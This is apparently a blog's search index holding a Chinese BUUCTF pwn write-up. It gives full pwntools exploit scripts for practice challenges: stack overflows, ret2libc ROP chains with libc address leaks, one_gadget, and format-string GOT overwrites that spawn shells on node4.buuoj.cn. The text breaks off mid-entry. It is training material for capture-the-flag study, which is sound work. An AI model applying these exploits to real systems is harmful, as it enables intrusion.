<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>逆向工程核心原理</title>
      <link href="/2021/11/26/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/"/>
      <url>/2021/11/26/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="3f5558bb655147d2fed53cb2d27d582965cbe8ca53392106975636243fb913fe">22064b17c03cb0c0e58c99349b6889d0ff95bd4ff0961f584c5dddf6194b3fb6685bb2137cbed9c17d4509760a22d72444d1d852c4778936aae1773904c7992fb3c73e82017a9cbfa13eb8ad0ff56ccf</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwn-1</title>
      <link href="/2021/10/28/buuctf-pwn-1/"/>
      <url>/2021/10/28/buuctf-pwn-1/</url>
      
        <content type="html"><![CDATA[<blockquote><p>未说明均是使用python3运行</p></blockquote><h1 id="test-your-nc"><a href="#test-your-nc" class="headerlink" title="test_your_nc"></a>test_your_nc</h1><p>若无法连接，先检查是否写对了远程地址，远程链接中间应为’ ‘空格,而不是’:’冒号。<br>若仍不行，尝试使用root用户<br>仍失败，使用exp</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc node4.buuoj.cn 28199</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28199</span>)</span><br><span class="line">io.interacve()</span><br></pre></td></tr></table></figure><h1 id="rip"><a href="#rip" class="headerlink" title="rip"></a>rip</h1><p>白给栈溢出</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27412</span>)</span><br><span class="line">system_addr = <span class="number">0x40118A</span></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;please input&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">15</span>+<span class="number">8</span>) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="warmup-csaw-2016"><a href="#warmup-csaw-2016" class="headerlink" title="warmup_csaw_2016"></a>warmup_csaw_2016</h1><p>白给</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27826</span>)</span><br><span class="line">system_addr = <span class="number">0x400611</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">64</span>+<span class="number">8</span>) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-1"><a href="#ciscn-2019-n-1" class="headerlink" title="ciscn_2019_n_1"></a>ciscn_2019_n_1</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstring&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="comment">//小数再内存中的十六进制表示</span></span><br><span class="line">    <span class="keyword">float</span> a = <span class="number">11.28125</span>;</span><br><span class="line">    <span class="built_in">cout</span>&lt;&lt;<span class="string">&quot;q is quit&quot;</span>&lt;&lt;<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">cin</span>&gt;&gt;a)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span>* p = (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)&amp;a;</span><br><span class="line">        <span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Ox&quot;</span> &lt;&lt; setfill(<span class="string">&#x27;0&#x27;</span>) &lt;&lt; hex</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*(p + <span class="number">3</span>)</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*(p + <span class="number">2</span>)</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*(p + <span class="number">1</span>)</span><br><span class="line">            &lt;&lt;setw(<span class="number">2</span>) &lt;&lt; (<span class="keyword">int</span>)*p &lt;&lt; <span class="built_in">endl</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//https://blog.csdn.net/tqydyqt/article/details/104974202</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25645</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Let\&#x27;s guess the number.&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>* <span class="number">44</span> + p64(<span class="number">0x41348000</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h1><p>由程序可知，输入”I”会变成”you”，在gdb中查看esp与ebp的距离，为60</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28929</span>)</span><br><span class="line">cat_flag_addr = <span class="number">0x08048F0D</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;I&#x27;</span>*<span class="number">20</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span> + p32(cat_flag_addr)</span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h1><p>白给</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">25415</span>)</span><br><span class="line">system_addr = <span class="number">0x0000000000400596</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span> + p64(<span class="number">0</span>) + p64(system_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h1><p>首先绕过加密函数，然后泄露puts.got的地址，下面exp中的libc_start_main无需泄露<br>重复泄露的过程，one_gadget打通。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">27301</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./ciscn_2019_c_1&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./ciscn_2019_c_1&#x27;</span>)</span><br><span class="line">puts_plt = elf.plt[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">puts_got = elf.got[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">libc_start_main_got = elf.got[<span class="string">&quot;__libc_start_main&quot;</span>]</span><br><span class="line">pop_rdi = <span class="number">0x0000000000400c83</span></span><br><span class="line">main_addr = <span class="number">0x0000000000400B28</span></span><br><span class="line">ret_addr = <span class="number">0x00000000004006b9</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露 puts_addr</span></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">79</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;Ciphertext\n&#x27;)</span></span><br><span class="line"><span class="comment">#print(io.recvline())</span></span><br><span class="line">print(io.recvline())</span><br><span class="line">print(io.recvline())</span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;))</span></span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(b&#x27;\x00&#x27;, 8))</span></span><br><span class="line">puts_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;puts_addr: &quot;</span> + <span class="built_in">hex</span>(puts_addr))</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露 libc_start_mainputs_addr</span></span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\0&#x27;</span>)))</span><br><span class="line">print(<span class="built_in">hex</span>(<span class="built_in">ord</span>(<span class="string">&#x27;\x00&#x27;</span>)))</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*<span class="number">79</span> + p64(<span class="number">0</span>) + p64(pop_rdi) + p64(libc_start_main_got) + p64(puts_plt) + p64(main_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;Ciphertext\n&#x27;)</span></span><br><span class="line"><span class="comment">#print(io.recvline())</span></span><br><span class="line">print(io.recvline())</span><br><span class="line">print(io.recvline())</span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;))</span></span><br><span class="line"><span class="comment">#print(io.recvuntil(b&#x27;\n&#x27;)[:-1].ljust(b&#x27;\x00&#x27;, 8))</span></span><br><span class="line">libc_start_mainputs_addr = u64(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">print(<span class="string">&quot;libc_start_mainputs_addr: &quot;</span> + <span class="built_in">hex</span>(libc_start_mainputs_addr))</span><br><span class="line"></span><br><span class="line">libcbase = puts_addr - <span class="number">0x809c0</span></span><br><span class="line">print(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libcbase))</span><br><span class="line">print(<span class="string">&quot;libcbase: &quot;</span> + <span class="built_in">hex</span>(libc_start_mainputs_addr - <span class="number">0x21ab0</span>))</span><br><span class="line">system_addr = <span class="number">0x4f440</span></span><br><span class="line">bin_sh_addr = <span class="number">0x1b3e9a</span></span><br><span class="line">onrged = [<span class="number">0x4f322</span>,<span class="number">0x4f2c5</span>,<span class="number">0x10a38c</span>]</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your choice!\n&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Input your Plaintext to be encrypted\n&#x27;</span>)</span><br><span class="line"><span class="comment">#payload = b&#x27;\x00&#x27; + b&#x27;a&#x27;*79 + p64(ret_addr) + p64(pop_rdi) + p64(libcbase + bin_sh_addr) + p64(libcbase + system_addr)     #不知道为什么打不通</span></span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;a&#x27;</span>*(<span class="number">79</span>+<span class="number">8</span>) + p64(libcbase + onrged[<span class="number">0</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="第五空间2019-决赛-PWN5"><a href="#第五空间2019-决赛-PWN5" class="headerlink" title="[第五空间2019 决赛]PWN5"></a>[第五空间2019 决赛]PWN5</h1><blockquote><p>exp1   直接修改需要对比的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./fifth_2019_PWN5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26343</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./fifth_2019_PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">bin_sh_addr = <span class="number">0x0804A03E</span></span><br><span class="line">system_addr = <span class="number">0x804C020</span></span><br><span class="line">addr = <span class="number">0x0804C044</span></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload = p32(addr) + p32(addr+<span class="number">1</span>) + p32(addr+<span class="number">2</span>) + p32(addr+<span class="number">3</span>) + <span class="string">b&#x27;%10$hhn%11$hhn%12$hhn%13$hhn&#x27;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;Hello,&quot;</span>)</span><br><span class="line">io.send(<span class="built_in">str</span>(<span class="number">0x10101010</span>))</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>exp2   修改aoti_got为system</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./fifth_2019_PWN5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26343</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./fifth_2019_PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">atoi_got = elf.got[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">system_plt = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;your name:&#x27;</span>)</span><br><span class="line">payload=fmtstr_payload(<span class="number">10</span>,&#123;atoi_got:system_plt&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello,&#x27;</span>)</span><br><span class="line">io.sendline(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><blockquote><p>exp3   使用库函数修改需要对比的内容</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#python2</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./fifth_2019_PWN5&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26343</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./fifth_2019_PWN5&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;your name:&quot;</span>)</span><br><span class="line">payload = fmtstr_payload(<span class="number">10</span>, &#123;<span class="number">0x0804C044</span> : <span class="number">1</span>&#125;)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.recvuntil(<span class="string">&quot;your passwd:&quot;</span>)</span><br><span class="line">payload = <span class="built_in">str</span>(<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="OGeek2019-babyrop"><a href="#OGeek2019-babyrop" class="headerlink" title="[OGeek2019]babyrop"></a>[OGeek2019]babyrop</h1><p>首先查看保护措施</p><p><img src="/2021/10/28/buuctf-pwn-1/4.png"></p><p>查看代码</p><h2 id="main"><a href="#main" class="headerlink" title="main"></a>main</h2><p><img src="/2021/10/28/buuctf-pwn-1/1.png"></p><p>函数sub_80486BB()为初始化缓冲区。 首先读取一个随机数，对随机数进行运算后得到v2，再对v2进行处理。</p><h2 id="sub-804871F"><a href="#sub-804871F" class="headerlink" title="sub_804871F"></a>sub_804871F</h2><p><img src="/2021/10/28/buuctf-pwn-1/2.png"></p><p>将刚才得到的随机数保存到s中，在读取我们的输入，保存在buf中<br>由于要进行比较，并且strlen遇到\x00会截断，输入\x00即可绕过比较<br>同时我们也可以控制buf[7]的值</p><h2 id="sub-80487D0"><a href="#sub-80487D0" class="headerlink" title="sub_80487D0"></a>sub_80487D0</h2><p><img src="/2021/10/28/buuctf-pwn-1/3.png"></p><p>这里的a1即是buf[7]，由于200不足以让我们溢出，所以我们要让buf[7]足够大以完成我们接下来的rop</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./OGeek2019_babyrop&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28567</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./OGeek2019_babyrop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">b&#x27;OGeek2019_babyrop.so&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_system = libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">libc_write = libc.symbols[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_bin_sh = <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">main_addr = <span class="number">0x08048825</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#绕过对比并修改buf[7]的值</span></span><br><span class="line">payload1 = <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;\xff&#x27;</span>*<span class="number">7</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#泄露write地址</span></span><br><span class="line">payload2 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span> + <span class="number">4</span>) + p32(write_plt) + p32(main_addr) + p32(<span class="number">1</span>) + p32(write_got) + p32(<span class="number">4</span>)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line">write_addr = u32(io.recv(<span class="number">4</span>))</span><br><span class="line">print(<span class="string">&quot;write_addr: &quot;</span>, <span class="built_in">hex</span>(write_addr))</span><br><span class="line"></span><br><span class="line">libcbase = write_addr - libc_write</span><br><span class="line">system_addr = libcbase + libc_system</span><br><span class="line">bin_sh_addr = libcbase + libc_bin_sh</span><br><span class="line"></span><br><span class="line"><span class="comment">#重复第一步</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Correct\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#ret2system</span></span><br><span class="line">payload3 = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xe7</span> + <span class="number">4</span>) + p32(system_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="ciscn-2019-n-8"><a href="#ciscn-2019-n-8" class="headerlink" title="ciscn_2019_n_8"></a>ciscn_2019_n_8</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./ciscn_2019_n_8&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">28551</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./ciscn_2019_n_8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;\&#x27;s your name?&#x27;)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">13</span>*<span class="number">4</span> + p32(<span class="number">0x11</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="jarvisoj-level2"><a href="#jarvisoj-level2" class="headerlink" title="jarvisoj_level2"></a>jarvisoj_level2</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#io = process(b&#x27;./jarvisoj_level2&#x27;)</span></span><br><span class="line">io = remote(<span class="string">b&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">26882</span>)</span><br><span class="line">elf = ELF(<span class="string">b&#x27;./jarvisoj_level2&#x27;</span>)</span><br><span class="line">system_addr = elf.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = <span class="built_in">next</span>(elf.search(<span class="string">b&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x88</span>+<span class="number">4</span>) + p32(system_addr) + p32(system_addr) + p32(bin_sh_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h1 id="get-started-3dsctf-2016"><a href="#get-started-3dsctf-2016" class="headerlink" title="get_started_3dsctf_2016"></a>get_started_3dsctf_2016</h1><p>查看保护措施</p><p><img src="/2021/10/28/buuctf-pwn-1/6.png"></p><p>又学到了新知识，还是太菜了啊</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">mprotect</span><span class="params">(<span class="keyword">void</span> *addr, <span class="keyword">size_t</span> len, <span class="keyword">int</span> prot)</span></span>;</span><br><span class="line">    addr 内存启始地址</span><br><span class="line">    len  